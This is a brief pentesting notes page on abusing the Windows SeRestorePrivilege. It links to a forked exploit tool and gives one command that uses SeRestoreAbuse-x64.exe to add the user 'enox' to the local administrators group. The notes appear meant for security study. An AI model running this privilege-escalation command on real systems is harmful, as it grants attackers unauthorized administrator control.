---
title: SeRestorePrivilege
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - windows
  - privilege
  - SeRestorePrivilege
---
# SeRestorePrivilege


SeRestorePrivilege is a dangerous permission. [Forked the repo](https://github.com/amandaguglieri/Privescalation/tree/main/tools/SeRestoreAbuse) that exploit this privilege:

```bash
.\SeRestoreAbuse-x64.exe "cmd /c net localgroup administrators enox /add"
```

